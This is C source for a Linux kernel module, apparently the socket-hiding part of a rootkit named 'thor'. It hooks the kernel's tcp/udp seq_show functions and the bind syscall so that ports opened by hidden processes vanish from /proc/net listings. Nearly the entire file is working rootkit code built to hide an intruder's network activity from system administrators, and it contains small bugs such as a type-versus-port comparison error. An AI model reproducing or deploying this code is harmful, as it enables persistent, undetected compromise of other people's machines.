#include "logging.h"
#include "pidhider.h"
#include "sockethider.h"

#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/fs.h>
#include <linux/kallsyms.h>
#include <linux/net.h>
#include <linux/slab.h>
#include <linux/socket.h>
#include <linux/version.h>
#include <net/tcp.h>
#include <net/udp.h>

#include "helper.h"
#include "hijack.h"
#include "logging.h"

/* socket list node */
struct _socket_list {
    int port;
    enum socket_type type;
    struct list_head list;
};

/* hiding lists */
static struct _socket_list socket_list;

/* original functions which we need to hijack */
static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
static int (*tcp6_seq_show)(struct seq_file *seq, void *v);
static int (*udp4_seq_show)(struct seq_file *seq, void *v);
static int (*udp6_seq_show)(struct seq_file *seq, void *v);
static long thor_bind(int fd, struct sockaddr __user *addr, int addrlen);

/* pointers to syscalls we need to hijack or use */
long (*sys_bind)(int fd, struct sockaddr __user *addr, int addrlen);

/* defines */
#define TMPSZ_TCP4 150
#define TMPSZ_TCP6 176
#define TMPSZ_UDP4 128
#define TMPSZ_UDP6 168

/* function prototypes */
static void *get_tcp_seq_show(const char *path);
static void *get_udp_seq_show(const char *path);
static int thor_tcp4_seq_show(struct seq_file *seq, void *v);
static int thor_tcp6_seq_show(struct seq_file *seq, void *v);
static int thor_udp4_seq_show(struct seq_file *seq, void *v);
static int thor_udp6_seq_show(struct seq_file *seq, void *v);

int sockethider_init(void)
{
    INIT_LIST_HEAD(&socket_list.list);

    tcp4_seq_show = get_tcp_seq_show("/proc/net/tcp");
    if (tcp4_seq_show == NULL)
        return -1;

    tcp6_seq_show = get_tcp_seq_show("/proc/net/tcp6");
    if (tcp6_seq_show == NULL)
        return -1;

    udp4_seq_show = get_udp_seq_show("/proc/net/udp");
    if (udp4_seq_show == NULL)
        return -1;

    udp6_seq_show = get_udp_seq_show("/proc/net/udp6");
    if (udp6_seq_show == NULL)
        return -1;

    sys_bind = (void*) kallsyms_lookup_name("sys_bind");

    if(sys_bind == NULL) {
        LOG_ERROR("failed to lookup syscall bind");
        return -1;
    }

    LOG_INFO("hijacking socket seq show functions");

    hijack(tcp4_seq_show, thor_tcp4_seq_show);
    hijack(tcp6_seq_show, thor_tcp6_seq_show);
    hijack(udp4_seq_show, thor_udp4_seq_show);
    hijack(udp6_seq_show, thor_udp6_seq_show);

    hijack(sys_bind, thor_bind);

    return 0;
}

void sockethider_cleanup(void)
{
    LOG_INFO("unhijacking socket seq show functions");

    if (tcp4_seq_show != NULL)
        unhijack(tcp4_seq_show);

    if (tcp6_seq_show != NULL)
        unhijack(tcp6_seq_show);

    if (udp4_seq_show != NULL)
        unhijack(udp4_seq_show);

    if (udp6_seq_show != NULL)
        unhijack(udp6_seq_show);

    if (sys_bind != NULL) {
        unhijack(sys_bind);
    }

    clear_socket_list();
}

/* function to get a pointer to the tcp{4,6}_seq_show function */
static void *get_tcp_seq_show(const char *path)
{
    void *ret;
    struct file *filep;
    struct tcp_seq_afinfo *afinfo;

    if ((filep = filp_open(path, O_RDONLY, 0)) == NULL)
        return NULL;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
    afinfo = PDE(filep->f_dentry->d_inode)->data;
#else
    afinfo = PDE_DATA(filep->f_dentry->d_inode);
#endif
    ret = afinfo->seq_ops.show;

    filp_close(filep, 0);

    return ret;
}

/* function to get a pointer to the udp{4,6}_seq_show function */
static void *get_udp_seq_show(const char *path)
{
    void *ret;
    struct file *filep;
    struct udp_seq_afinfo *afinfo;

    if ((filep = filp_open(path, O_RDONLY, 0)) == NULL)
        return NULL;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
    afinfo = PDE(filep->f_dentry->d_inode)->data;
#else
    afinfo = PDE_DATA(filep->f_dentry->d_inode);
#endif
    ret = afinfo->seq_ops.show;

    filp_close(filep, 0);

    return ret;
}

static int thor_tcp4_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    char port[12];
    struct _socket_list *tmp;

    /*
     * TODO: this leaves the tcp4_seq_show function unhijacked for a few
     * cycles, ideally we would execute the content of tcp4_seq_show_firstinstr
     * and jump to the second instruction of the original tcp4_seq_show
     */
    unhijack(tcp4_seq_show);
    ret = tcp4_seq_show(seq, v);
    hijack(tcp4_seq_show, thor_tcp4_seq_show);

    /* hide port */
    list_for_each_entry(tmp, &(socket_list.list), list) {
        if (tmp->type == tcp4) {
            sprintf(port, ":%04X", tmp->port);

            if (strnstr(seq->buf + seq->count - TMPSZ_TCP4, port, TMPSZ_TCP4)) {
                LOG_INFO("hiding socket tcp4 %d", tmp->port);
                seq->count -= TMPSZ_TCP4;
                break;
            }
        }
    }

    return ret;
}

static int thor_tcp6_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    char port[12];
    struct _socket_list *tmp;

    /*
     * TODO: this leaves the tcp6_seq_show function unhijacked for a few
     * cycles, ideally we would execute the content of tcp6_seq_show_firstinstr
     * and jump to the second instruction of the original tcp6_seq_show
     */
    unhijack(tcp6_seq_show);
    ret = tcp6_seq_show(seq, v);
    hijack(tcp6_seq_show, thor_tcp6_seq_show);

    /* hide port */
    list_for_each_entry(tmp, &(socket_list.list), list) {
        if (tmp->type == tcp6) {
            sprintf(port, ":%04X", tmp->port);

            if (strnstr(seq->buf + seq->count - TMPSZ_TCP6, port, TMPSZ_TCP6)) {
                LOG_INFO("hiding socket tcp6 %d", tmp->port);
                seq->count -= TMPSZ_TCP6;
                break;
            }
        }
    }

    return ret;
}

static int thor_udp4_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    char port[12];
    struct _socket_list *tmp;

    /*
     * TODO: this leaves the udp4_seq_show function unhijacked for a few
     * cycles, ideally we would execute the content of udp4_seq_show_firstinstr
     * and jump to the second instruction of the original udp4_seq_show
     */
    unhijack(udp4_seq_show);
    ret = udp4_seq_show(seq, v);
    hijack(udp4_seq_show, thor_udp4_seq_show);

    /* hide port */
    list_for_each_entry(tmp, &(socket_list.list), list) {
        if (tmp->type == udp4) {
            sprintf(port, ":%04X", tmp->port);

            if (strnstr(seq->buf + seq->count - TMPSZ_UDP4, port, TMPSZ_UDP4)) {
                LOG_INFO("hiding socket udp4 %d", tmp->port);
                seq->count -= TMPSZ_UDP4;
                break;
            }
        }
    }

    return ret;
}

static int thor_udp6_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    char port[12];
    struct _socket_list *tmp;

    /*
     * TODO: this leaves the udp6_seq_show function unhijacked for a few
     * cycles, ideally we would execute the content of udp6_seq_show_firstinstr
     * and jump to the second instruction of the original udp6_seq_show
     */
    unhijack(udp6_seq_show);
    ret = udp6_seq_show(seq, v);
    hijack(udp6_seq_show, thor_udp6_seq_show);

    /* hide port */
    list_for_each_entry(tmp, &(socket_list.list), list) {
        if (tmp->type == udp6) {
            sprintf(port, ":%04X", tmp->port);

            if (strnstr(seq->buf + seq->count - TMPSZ_UDP6, port, TMPSZ_UDP6)) {
                LOG_INFO("hiding socket udp6 %d", tmp->port);
                seq->count -= TMPSZ_UDP6;
                break;
            }
        }
    }

    return ret;
}

static long thor_bind(int fd, struct sockaddr __user *sa, int addrlen)
{
    long ret;

    if(is_pid_hidden(current->pid))
    {
        struct socket *sock;
        struct sock *sk;
        int err;
        int port;
        enum sock_type socket_type;

        LOG_INFO("process calling bind is hidden, trying to hide socket");

        sock = sockfd_lookup(fd, &err);

        if (NULL == sock) {
            LOG_ERROR("sockfd_lookup_light failed %d\n", err);
            goto do_bind;
        }

        sk = sock->sk;

        if (sa->sa_family == AF_INET) {
            struct sockaddr_in *sin = (struct sockaddr_in*) sa;

            port = ntohs(sin->sin_port);

            if (sk->sk_type == SOCK_STREAM) {
                socket_type = tcp4;
            } else if (sk->sk_type == SOCK_DGRAM) {
                socket_type = udp4;
            } else {
                LOG_INFO("unknown socket type %d (neither SOCK_STREAM nor SOCK_DGRAM)", sk->sk_type);
                goto do_bind;
            }
        } else if (sa->sa_family == AF_INET6) {
            struct sockaddr_in6 *sin6 = (struct sockaddr_in6*) sa;

            port = ntohs(sin6->sin6_port);

            if (sk->sk_type == SOCK_STREAM) {
                socket_type = tcp6;
            } else if (sk->sk_type == SOCK_DGRAM) {
                socket_type = udp6;
            } else {
                LOG_INFO("unknown socket type %d (neither SOCK_STREAM nor SOCK_DGRAM)", sk->sk_type);
                goto do_bind;
            }
        } else {
            LOG_INFO("unknown protocol family %d (neither AF_INET nor AF_INET6)", sa->sa_family);
            goto do_bind;
        }

        add_to_socket_list(port, socket_type);
    }

    do_bind:
    unhijack(sys_bind);
    ret = sys_bind(fd, sa, addrlen);
    hijack(sys_bind, thor_bind);

    return ret;
}

void add_to_socket_list(int port, enum socket_type type)
{
    struct _socket_list *tmp;

    LOG_INFO("adding socket %d to hiding list", port);

    tmp = (struct _socket_list*) kmalloc(sizeof(struct _socket_list), GFP_KERNEL);
    tmp->port = port;
    tmp->type = type;

    list_add(&(tmp->list), &(socket_list.list));
}

void remove_from_socket_list(int port, enum socket_type type)
{
    struct _socket_list *tmp;
    struct list_head *pos, *q;

    list_for_each_safe(pos, q, &(socket_list.list)) {
        tmp = list_entry(pos, struct _socket_list, list);
        if (port == tmp->port && type == tmp->port) {
            LOG_INFO("removing socket %d from hiding list", port);
            list_del(pos);
            kfree(tmp);
        }
    }
}

void clear_socket_list(void)
{
    struct _socket_list *tmp;
    struct list_head *pos, *q;

    LOG_INFO("clearing socket hiding list");

    list_for_each_safe(pos, q, &(socket_list.list)) {
        tmp = list_entry(pos, struct _socket_list, list);
        list_del(pos);
        kfree(tmp);
    }
}

void hide_sockets_by_pid(unsigned short pid) {
    mm_segment_t oldfs;
    struct file *filp;
    char line[TMPSZ_UDP4];
    loff_t pos = 0;
    ssize_t s;

    /* ex: /proc/65536/net/tcp6 */
    char fname[22];

    oldfs = get_fs();
    set_fs(get_ds());

    snprintf(fname, 22, "/proc/%d/net/udp", pid);
    filp = filp_open(fname, O_RDONLY, 0);
    if (filp == NULL) {
        LOG_ERROR("could not open /proc/%d/net/udp", pid);
        return;
    }

    // skip first line
    vfs_read(filp, line, TMPSZ_UDP4, &pos);

    while ((s = vfs_read(filp, line, TMPSZ_UDP4, &pos)) == TMPSZ_UDP4) {
        char port_str[5];
        int port;
        char *ptr;

        LOG_INFO("reading /proc/%d/net/udp file line", pid);

        // find port
        ptr = strnstr(line, ":", TMPSZ_UDP4);
        ptr++;
        ptr = strnstr(ptr, ":", TMPSZ_UDP4);
        ptr++;

        // copy port
        memcpy(port_str, ptr, 4);
        port_str[4] = 0;

        LOG_INFO("port found %s", port_str);

        // hex to int
        kstrtoint(port_str, 16, &port);

        // add to list
        add_to_socket_list(port, udp4);
    }

    LOG_INFO("DEBUG: s = %d", s);

    filp_close(filp, NULL);

    set_fs(oldfs);
}
